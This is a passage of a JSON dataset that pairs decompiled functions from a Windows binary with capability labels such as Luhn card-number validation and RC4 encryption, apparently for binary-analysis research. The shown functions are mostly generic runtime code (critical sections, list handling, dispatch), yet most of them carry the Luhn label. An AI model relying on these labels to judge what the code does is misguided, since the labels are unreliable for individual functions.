        "decompiled_code": "\nvoid fcn.00415d0c(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x415e32;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x415d50;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x415d68;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x415d80;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else {\n        cVar1 = fcn.00416168();\n        if (cVar1 == '\\0') {\n            fcn.00409e74();\n            puStack552 = 0x415df3;\n            fcn.00405864();\n        }\n        else {\n            puStack552 = &fcn.00415d0c::var_104h;\n            fcn.00404530();\n            fcn.00403098();\n            fcn.00405794();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.00405864();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x415e39;\n    iStack548 = 0x415e31;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 488
    },
    "00415f74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f74(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.00416168(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.004160e8();\n    return;\n}\n",
        "token_count": 125
    },
    "00415fc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00415fc8(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x48faae + (in_ECX >> 0x18));\n}\n",
        "token_count": 108
    },
    "0041603c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041603c(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x416047;\n    *NULL = fcn.00404a1c();\n    uStack16 = 0x497994;\n    uStack20 = 0x416057;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x497990 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x48fa6c;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x4160a6;\n    uStack24 = 0x497994;\n    uStack28 = 0x41609e;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 280
    },
    "00416224": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416224(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x4162fa;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x497994;\n    puStack308 = 0x416257;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack312 = 0x4162dd;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00406774();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x497990 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x48fa6c)) {\n                fcn.00404530();\n                fcn.00405794();\n                cVar2 = fcn.00409a74();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x4162e4;\n    uStack312 = 0x497994;\n    uStack316 = 0x4162dc;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 479
    },
    "00416774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416774(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 330
    },
    "004167c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004167c8(void)\n\n{\n    fcn.004057e8();\n    fcn.00416774();\n    return;\n}\n",
        "token_count": 33
    },
    "00416810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416810(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.004167fc();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 116
    },
    "004168d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004168d8(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41699f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.004057d4();\n        fcn.004168a8();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00405d64();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4169a6;\n    uStack36 = 0x41699e;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 405
    },
    "00416bbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416bbc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.00416ba8();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 117
    },
    "00416bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416bfc(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "00416c34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416c34(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00416c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416c70(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00407024();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00418558": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418558(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.00419888();\n            cVar1 = fcn.0040487c();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.0040487c(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 205
    },
    "0041896c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041896c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar2 = fcn.00418628();\n    fcn.00419730();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 212
    },
    "00418ac8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00418ac8(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x418b4b;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404530();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040db28(arg_8h_00, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x418b52;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 280
    },
    "00418c24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418c24(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00418cdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418cdc(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "00418f28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418f28(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x418f88;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00407550();\n    fcn.0040db28(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x418f8f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 228
    },
    "00419218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419218(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004192f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004192f8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.00409a74();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 183
    },
    "00419338": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00419338(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                fcn.00405584();\n                return 1;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 146
    },
    "004195a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004195a0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x419636;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x418138) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004045dc();\n        fcn.004195a0(arg_8h);\n        fcn.00404530();\n        fcn.00405794();\n        fcn.004069c0(0);\n        fcn.00406a10();\n        fcn.00419438();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x41963d;\n    uStack280 = 0x419635;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 255
    },
    "0041977c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041977c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.00419814();\n    }\n    iVar1 = *(in_EAX[1] + param_2 * 4);\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "004197dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004197dc(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.004197d8();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040db28(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405470();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 195
    },
    "00419904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419904(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] < param_2)) {\n        fcn.00419814();\n    }\n    if (in_EAX[2] == in_EAX[3]) {\n        (***in_EAX)();\n    }\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    *(in_EAX[1] + param_2 * 4) = param_1;\n    in_EAX[2] = in_EAX[2] + 1;\n    if (param_1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004199ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004199ec(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.00419814();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f34();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "00419a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419a28(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.00419814();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.004199ec();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403af4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.0041977c();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 244
    },
    "00419aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419aa0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 187
    },
    "00419af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00419af4(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x419aff;\n    *NULL = fcn.00404a1c();\n    puStack16 = 0x419b0d;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00419bf8();\n    iStack20 = 0x419b57;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00404650();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x419b5e;\n    iStack20 = 0x419b4a;\n    fcn.00419c5c();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x419b56;\n    sub.kernel32.dll_DeleteCriticalSection();\n    return;\n}\n",
        "token_count": 273
    },
    "00419c5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00419c5c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 41
    },
    "00419e44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00419e44(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x419efa;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.004055c8();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404530();\n        fcn.00405794();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00404530();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040dbe4(1, &var_114h);\n    fcn.00404ec4();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x419f01;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 344
    },
    "0041a18c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a18c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a233;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x41a1b6;\n    fcn.0041a2fc();\n    uStack48 = 0x41a216;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x41a21d;\n    uStack48 = 0x41a215;\n    fcn.0041a3b8();\n    return;\n}\n",
        "token_count": 365
    },
    "0041a244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a244(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41a25c;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x41a26c;\n        fcn.0041a2fc();\n        uStack24 = 0x41a2e4;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        (**(*in_EAX + 0x44))();\n        *(in_EAX + 1) = *(param_2 + 4);\n        *(in_EAX + 0xd) = *(param_2 + 0xd);\n        *(in_EAX + 3) = *(param_2 + 0xc);\n        *(in_EAX + 5) = *(param_2 + 5);\n        fcn.00405584();\n        *(in_EAX + 0xe) = *(param_2 + 0xe);\n        (**(*in_EAX + 0x40))();\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x41a2f5;\n        uStack24 = 0x41a2e3;\n        fcn.0041a3b8();\n        return;\n    }\n    puStack20 = 0x41a2f5;\n    fcn.00419e30();\n    return;\n}\n",
        "token_count": 390
    },
    "0041a36c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
